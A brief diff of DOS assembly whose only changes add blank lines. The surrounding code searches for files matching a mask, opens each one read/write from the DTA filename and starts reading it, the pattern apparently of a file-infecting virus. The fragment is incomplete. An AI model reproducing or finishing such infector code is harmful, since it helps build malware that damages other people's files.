@@ -8,11 +8,13 @@ mov ah,4Eh
 lea dx,fmask
 find_first_next:
 int 21h
+
 jc exit
 open:
 mov ax,3D02h
 mov dx,9Eh
 int 21h
+
 jc exit
 xchg ax,bx
 mov ah,3Fh
